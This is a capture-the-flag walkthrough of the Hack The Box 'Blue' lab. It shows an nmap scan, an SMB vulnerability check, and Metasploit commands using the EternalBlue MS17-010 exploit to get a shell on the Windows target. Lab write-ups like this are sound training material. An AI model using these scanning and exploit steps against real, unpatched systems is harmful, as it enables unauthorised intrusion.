# Hack the box - Blue

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/windows.png"> </span><b>Windows</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.40</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2017 Jul 28</b>

___

## Port scanning
```
nmap -sC -sV -T4 -oA nmap 10.10.10.40
```
![Nmap results](./nmap.png)

We quickly notice computer user haris-PC and SMB service running on the host with port 445. It could be vulnerable, so let's check for nmap scripts:

```
ls -la /usr/share/nmap/scripts/ | grep smb*
```

![Nmap smb scripts](nmap_smb_scripts_list.png)

Let's run all of them on nmap:

![Nmap smb vulnerability check](smb_vulnerable.png)

We can see that machine is vulnerable to ms17-10 exploit.

## Getting access

We could use metasploit for running this exploit:

```
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.10.10.40
set SMBUser haris-PC
exploit
```

![Metasploit exploit](exploit.png)

As we can see, we got shell. Lets check for current user and try to capture the flags:

![Flag capture](flag_capture.png)